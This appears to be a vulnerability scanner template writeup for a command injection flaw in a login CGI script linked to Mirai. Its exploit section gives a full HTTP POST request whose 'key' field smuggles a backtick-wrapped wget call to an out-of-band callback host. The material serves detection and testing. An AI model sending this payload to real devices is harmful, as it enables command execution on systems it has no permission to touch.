# Nuclei Template: Mirai - Remote Command Injection
**Template ID:** mirai-unknown-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`mirai-unknown-rce.yaml`)

## Vulnerability Information & PoC

## Description
Mirai is susceptible to an unknown exploit that targets the login CGI script, where a key parameter is not properly sanitized leading to a command injection vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST /cgi-bin/login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

key=';`wget http://{{interactsh-url}}`;#
```

## References
- https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai
